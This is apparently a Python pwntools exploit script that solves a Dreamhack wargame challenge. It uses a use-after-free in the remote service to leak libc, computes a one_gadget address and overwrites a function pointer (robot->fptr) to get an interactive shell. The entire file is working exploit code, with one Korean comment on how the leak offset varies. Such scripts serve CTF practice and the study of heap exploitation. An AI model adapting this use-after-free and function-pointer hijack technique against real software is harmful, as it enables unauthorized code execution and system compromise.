from pwn import *

port = 16364
rem = remote("host3.dreamhack.games", port)

def slog(sym, val): success(sym + ': ' + hex(val))

def human(weight, age):
  rem.sendlineafter(b'>', b'1')
  rem.sendlineafter(b': ', str(weight).encode())
  rem.sendlineafter(b': ', str(age).encode())

def robot(weight):
  rem.sendlineafter(b'>', b'2')
  rem.sendlineafter(b': ', str(weight).encode())

def custom(size, data, idx):
  rem.sendlineafter(b'>', b'3')
  rem.sendlineafter(b': ', str(size).encode())
  rem.sendafter(b': ', data)
  rem.sendlineafter(b': ', str(idx).encode())

# UAF to calculate the `libc_base`
custom(0x500, b'AAAA', -1)
custom(0x500, b'AAAA', -1)
custom(0x500, b'AAAA', 0)
custom(0x500, b'B', -1) # data 값이 'B'가 아니라 'C'가 된다면, offset은 0x3ebc42 가 아니라 0x3ebc43이 됩니다.

gadget_offset = 0x10a41c
lib_base = u64(rem.recvline()[:-1].ljust(8, b'\x00')) - 0x3ebc42
gadget_addr = lib_base + gadget_offset

slog('libc_base', lib_base)
slog('one_gadget', gadget_addr)

# UAF to manipulate `robot->fptr` & get shell
human(1, gadget_addr)
robot(1)

rem.interactive()